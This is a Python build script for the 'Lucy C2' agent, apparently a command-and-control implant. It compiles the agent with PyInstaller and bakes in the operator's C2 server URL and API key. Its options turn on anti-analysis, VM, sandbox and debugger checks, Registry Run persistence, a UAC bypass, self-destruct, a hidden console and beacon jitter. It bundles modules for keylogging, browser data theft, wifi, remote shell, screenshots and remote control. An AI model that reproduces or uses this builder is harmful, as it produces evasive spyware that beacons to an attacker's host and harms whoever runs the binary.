#!/usr/bin/env python3
"""
Lucy C2 — Precompiled portable agent builder.

Compiles the Lucy agent into a standalone binary using PyInstaller.
The agent source (agent/) plus a baked-in config.py are bundled into
a single .exe (Windows) or single binary (Linux/macOS).

Usage:
    # Single-file binary pointing at a local C2
    python tools/portable/build_agent_portable.py --onefile --c2-url http://127.0.0.1:8000

    # Directory-mode build (faster startup, multiple files)
    python tools/portable/build_agent_portable.py --onedir --c2-url http://10.0.0.5:8000

    # With API key and custom module set
    python tools/portable/build_agent_portable.py --onefile \\
        --c2-url http://127.0.0.1:8000 \\
        --api-key my-secret-key \\
        --modules info shell screenshot

Requirements:
    PyInstaller must be installed in the current Python environment:
        pip install pyinstaller
    Agent runtime deps (psutil, websocket-client, pycryptodome, cryptography)
    must also be importable so PyInstaller can bundle them.
"""
from __future__ import annotations

import argparse
import hashlib
import os
import platform
import shutil
import subprocess
import sys
import tempfile
from datetime import datetime, timedelta, timezone
from pathlib import Path

# Root of the Lucy repository
ROOT = Path(__file__).resolve().parent.parent.parent
AGENT_SRC = ROOT / "agent"
OUTPUT_DIR = ROOT / "tools" / "portable" / "dist" / "agent"

# Modules that live as local .py files inside the agent package.
# These are passed to PyInstaller as --hidden-import so the frozen
# binary can import them at runtime.
HIDDEN_IMPORTS = [
    "agent",
    "core.crypto",
    "core.stealth",
    "core.offline_queue",
    "core.loader",
    "modules.builtin",
    "modules.shell",
    "modules.screenshot",
    "modules.keylog",
    "modules.wifi",
    "modules.port_scan",
    "modules.browser",
    "modules.anti_analysis",
    "modules.remote_control",
    "modules.screen_stream",
    "modules.stealth",
    # Third-party packages the agent imports at runtime
    "psutil",
    "websocket",
    "cryptography",
    "Crypto",
]


def log(msg: str) -> None:
    print(f"[build_agent] {msg}")


def run(cmd: list[str | Path], cwd: Path | None = None, check: bool = True) -> subprocess.CompletedProcess[str]:
    log("$ " + " ".join(str(c) for c in cmd))
    proc = subprocess.run(
        [str(c) for c in cmd],
        cwd=str(cwd or ROOT),
        text=True,
    )
    if proc.returncode != 0 and check:
        raise subprocess.CalledProcessError(proc.returncode, cmd)
    return proc


def _derive_ws_url(http_url: str) -> str:
    """Convert an HTTP C2 URL into a WebSocket URL."""
    url = http_url.rstrip("/")
    if url.startswith("https://"):
        return url.replace("https://", "wss://", 1)
    if url.startswith("http://"):
        return url.replace("http://", "ws://", 1)
    return f"ws://{url}"


def _auth_hash(token: str) -> str:
    return hashlib.sha256(token.encode()).hexdigest()[:16]


def write_config_py(path: Path, args: argparse.Namespace) -> None:
    """Write a baked-in config.py next to the agent source.

    The agent's ``load_config()`` tries ``import config`` first, so this
    file overrides the defaults at runtime without any external .ini.
    """
    ws_url = _derive_ws_url(args.c2_url)
    expires_at = (
        datetime.now(timezone.utc) + timedelta(days=args.ttl_days)
    ).isoformat()
    auth_hash = _auth_hash(args.auth_token) if args.auth_token else ""

    modules = args.modules if args.modules else ["info", "shell"]

    # Stealth pack expands into a hardened, low-footprint configuration.
    if args.stealth_pack:
        anti_analysis = True
        hide_window = True
        beacon_jitter = True
        startup_delay = max(args.startup_delay, 5)
        self_destruct = True
        persistence = False
        single_execution = False
    else:
        anti_analysis = args.anti_analysis
        hide_window = args.hide_window
        beacon_jitter = args.beacon_jitter
        startup_delay = args.startup_delay
        self_destruct = args.self_destruct
        persistence = args.persistence
        single_execution = args.single_execution

    path.write_text(
        f'C2_URL = {args.c2_url!r}\n'
        f'WS_URL = {ws_url!r}\n'
        f'API_KEY = {args.api_key!r}\n'
        f'HEARTBEAT_MIN = 15\n'
        f'HEARTBEAT_MAX = 30\n'
        f'TASK_TIMEOUT = 60\n'
        f'USE_WEBSOCKET = True\n'
        f'VERIFY_SSL = False\n'
        f'PROXY = ""\n'
        f'STEALTH_MODE = True\n'
        f'STEALTH_IDLE_THRESHOLD = 60\n'
        f'STEALTH_ACTIVE_DELAY = 5\n'
        f'MODULES = {modules!r}\n'
        f'ANTI_ANALYSIS = {anti_analysis!r}\n'
        f'PERSISTENCE = {persistence!r}\n'
        f'HIDE_WINDOW = {hide_window!r}\n'
        f'STARTUP_DELAY = {startup_delay}\n'
        f'SINGLE_EXECUTION = {single_execution!r}\n'
        f'SELF_DESTRUCT = {self_destruct!r}\n'
        f'VM_CHECK = {args.vm_check!r}\n'
        f'DEBUGGER_CHECK = {args.debugger_check!r}\n'
        f'SANDBOX_CHECK = {args.sandbox_check!r}\n'
        f'BEACON_JITTER = {beacon_jitter!r}\n'
        f'MAX_RECONNECT = {args.max_reconnect}\n'
        f'REGISTRY_RUN = {args.registry_run!r}\n'
        f'UAC_BYPASS = {args.uac_bypass!r}\n'
        f'CUSTOM_NAME = {args.custom_name!r}\n'
        f'TTL_DAYS = {args.ttl_days}\n'
        f'EXPIRES_AT = {expires_at!r}\n'
        f'BUILD_ID = "portable-{datetime.now(timezone.utc).strftime("%Y%m%d%H%M%S")}"\n'
        f'OPERATOR_ID = "portable-build"\n'
        f'AUTH_HASH = {auth_hash!r}\n'
    )
    log(f"Wrote baked-in config: {path}")


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Build a precompiled portable Lucy agent binary with PyInstaller.",
    )

    # Build mode (mutually exclusive)
    mode = parser.add_mutually_exclusive_group()
    mode.add_argument(
        "--onefile",
        action="store_const",
        dest="build_mode",
        const="onefile",
        help="Single-file mode: one self-contained executable (slower startup, smaller footprint).",
    )
    mode.add_argument(
        "--onedir",
        action="store_const",
        dest="build_mode",
        const="onedir",
        help="Directory mode: a folder with the executable and dependencies (faster startup).",
    )
    parser.set_defaults(build_mode="onefile")

    # C2 connection
    parser.add_argument(
        "--c2-url",
        type=str,
        default="http://127.0.0.1:8000",
        help="C2 server URL the agent will connect to (default: http://127.0.0.1:8000).",
    )
    parser.add_argument(
        "--api-key",
        type=str,
        default="",
        help="API key baked into the agent for authentication.",
    )
    parser.add_argument(
        "--auth-token",
        type=str,
        default="",
        help="Build authorization token (stored as AUTH_HASH in config).",
    )

    # Modules
    parser.add_argument(
        "--modules",
        type=str,
        nargs="*",
        default=["info", "shell"],
        help="Module names to enable (default: info shell).",
    )

    # Agent behaviour
    parser.add_argument(
        "--custom-name",
        type=str,
        default="lucy_agent",
        help="Output binary name (default: lucy_agent).",
    )
    parser.add_argument(
        "--hide-window",
        action="store_true",
        default=True,
        help="Hide the console window (default: True on Windows).",
    )
    parser.add_argument(
        "--no-hide-window",
        action="store_false",
        dest="hide_window",
        help="Show the console window.",
    )
    parser.add_argument(
        "--startup-delay",
        type=int,
        default=0,
        help="Startup delay in seconds (default: 0).",
    )
    parser.add_argument(
        "--ttl-days",
        type=int,
        default=7,
        help="Agent TTL in days before self-expiry (default: 7).",
    )
    parser.add_argument(
        "--max-reconnect",
        type=int,
        default=50,
        help="Maximum handshake reconnection attempts (default: 50).",
    )

    # Stealth / anti-analysis
    parser.add_argument(
        "--stealth-pack",
        action="store_true",
        help="Enable full stealth pack (anti-analysis, hide window, jitter, self-destruct).",
    )
    parser.add_argument(
        "--anti-analysis",
        action="store_true",
        help="Enable anti-analysis / sandbox checks.",
    )
    parser.add_argument(
        "--persistence",
        action="store_true",
        help="Enable persistence mechanisms.",
    )
    parser.add_argument(
        "--single-execution",
        action="store_true",
        help="Exit after the first task session.",
    )
    parser.add_argument(
        "--self-destruct",
        action="store_true",
        help="Remove the agent executable after the session ends.",
    )
    parser.add_argument(
        "--vm-check",
        action="store_true",
        help="Enable VM detection checks.",
    )
    parser.add_argument(
        "--debugger-check",
        action="store_true",
        help="Enable debugger detection checks.",
    )
    parser.add_argument(
        "--sandbox-check",
        action="store_true",
        help="Enable sandbox detection checks.",
    )
    parser.add_argument(
        "--beacon-jitter",
        action="store_true",
        default=True,
        help="Enable beacon timing jitter (default: True).",
    )
    parser.add_argument(
        "--no-beacon-jitter",
        action="store_false",
        dest="beacon_jitter",
        help="Disable beacon timing jitter.",
    )
    parser.add_argument(
        "--registry-run",
        action="store_true",
        help="Add a Registry Run key for persistence (Windows).",
    )
    parser.add_argument(
        "--uac-bypass",
        action="store_true",
        help="Attempt UAC bypass (Windows).",
    )

    # Output
    parser.add_argument(
        "--output-dir",
        type=str,
        default=str(OUTPUT_DIR),
        help=f"Output directory (default: {OUTPUT_DIR}).",
    )
    parser.add_argument(
        "--clean",
        action="store_true",
        help="Remove PyInstaller cache and temp files before building.",
    )

    return parser.parse_args()


def check_pyinstaller() -> None:
    """Verify PyInstaller is available."""
    try:
        import PyInstaller  # noqa: F401
    except ImportError:
        log("ERROR: PyInstaller is not installed.")
        log("       Install it with:  pip install pyinstaller")
        sys.exit(1)


def build_agent(args: argparse.Namespace) -> Path:
    """Run the full build pipeline and return the path to the output artifact."""
    check_pyinstaller()

    if not AGENT_SRC.exists() or not (AGENT_SRC / "main.py").exists():
        log(f"ERROR: Agent source not found at {AGENT_SRC}")
        sys.exit(1)

    output_dir = Path(args.output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)

    # Use a temp directory so we don't pollute the agent source tree.
    tmpdir = Path(tempfile.mkdtemp(prefix="lucy_agent_build_"))
    log(f"Build workspace: {tmpdir}")

    try:
        # 1. Copy agent source into the temp dir
        src = tmpdir / "agent"
        shutil.copytree(
            str(AGENT_SRC),
            str(src),
            ignore=shutil.ignore_patterns("__pycache__", "*.pyc", ".git", "tests", ".pytest_cache"),
        )
        log(f"Copied agent source to {src}")

        # 2. Bake in the config
        write_config_py(src / "config.py", args)

        # 3. Assemble PyInstaller command
        dist_dir = tmpdir / "dist"
        work_dir = tmpdir / "build"
        spec_dir = tmpdir / "spec"

        out_name = args.custom_name
        is_windows = platform.system() == "Windows"
        onefile = args.build_mode == "onefile"

        cmd: list[str | Path] = [
            sys.executable,
            "-m",
            "PyInstaller",
            "--onefile" if onefile else "--onedir",
            "--noconfirm",
            "--distpath", str(dist_dir),
            "--workpath", str(work_dir),
            "--specpath", str(spec_dir),
            "--name", out_name,
        ]

        # Hide console window on Windows if requested
        if is_windows and args.hide_window:
            cmd.append("--noconsole")

        # Clean flag
        if args.clean:
            cmd.append("--clean")

        # Hidden imports
        for hi in HIDDEN_IMPORTS:
            cmd += ["--hidden-import", hi]

        # Collect all subpackages so PyInstaller bundles them
        cmd += ["--collect-submodules", "core"]
        cmd += ["--collect-submodules", "modules"]

        # Entry point
        cmd.append(str(src / "main.py"))

        # Set PYTHONPATH so PyInstaller can analyse the agent package
        env = os.environ.copy()
        env["PYTHONPATH"] = str(src) + os.pathsep + env.get("PYTHONPATH", "")

        # 4. Run PyInstaller
        log("Running PyInstaller...")
        log("$ " + " ".join(str(c) for c in cmd))
        proc = subprocess.run(
            [str(c) for c in cmd],
            env=env,
            text=True,
        )
        if proc.returncode != 0:
            log("ERROR: PyInstaller build failed.")
            sys.exit(proc.returncode)

        # 5. Copy output to the final destination
        if onefile:
            # Single executable: dist/<name>.exe (Windows) or dist/<name> (Unix)
            ext = ".exe" if is_windows else ""
            built = dist_dir / f"{out_name}{ext}"
            if not built.exists():
                log(f"ERROR: Expected output not found: {built}")
                sys.exit(1)
            final = output_dir / built.name
            shutil.copy2(str(built), str(final))
            log(f"Build complete: {final}")
            return final
        else:
            # Directory mode: dist/<name>/ folder
            built_dir = dist_dir / out_name
            if not built_dir.exists():
                log(f"ERROR: Expected output directory not found: {built_dir}")
                sys.exit(1)
            final_dir = output_dir / out_name
            if final_dir.exists():
                shutil.rmtree(final_dir)
            shutil.copytree(str(built_dir), str(final_dir))
            log(f"Build complete: {final_dir}")
            return final_dir

    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)


def main() -> None:
    args = parse_args()
    log(f"Build mode: {args.build_mode}")
    log(f"C2 URL:     {args.c2_url}")
    log(f"Modules:    {args.modules}")
    log(f"Output dir: {args.output_dir}")
    build_agent(args)


if __name__ == "__main__":
    main()
